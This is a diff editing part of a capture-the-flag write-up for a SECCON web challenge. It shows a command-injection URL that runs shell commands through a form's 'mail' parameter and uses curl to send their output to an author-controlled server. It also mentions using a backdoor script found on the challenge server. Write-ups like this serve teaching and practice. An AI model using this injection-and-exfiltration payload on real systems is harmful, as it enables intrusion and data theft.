@@ -29,10 +29,9 @@ Yup, we can inject commands into the "mail" query string argument after a single
 ```
 http://entryform.pwn.seccon.jp/register.cgi?mail=%27`curl%20<my server>:9999/%20--data%20%22$(ls)%22`%27&name=asdf&action=Send
 ```
-Note: I used `curl -d` to send command to the a server I controlled, but apparently that was not needed, you could just run the command
-and the results would show up in the page.
+Note: I used `curl -d` to send the results of the commands I ran to a server I controlled, but apparently that was not needed; you could just run the commandand the results would show up in the page.
 
-Either way, next I tried run `cat log`, but this does not work because the user we are running commands as only has write permissions to that file.
+Either way, next we try to run `cat log`, but this does not work because the user we are running commands as only has write permissions to that file.
 
 Conveniently, we find a script `backdoor123.php` under the `SECRETS` directory on the web server. It provides a way around this issue:
 ```
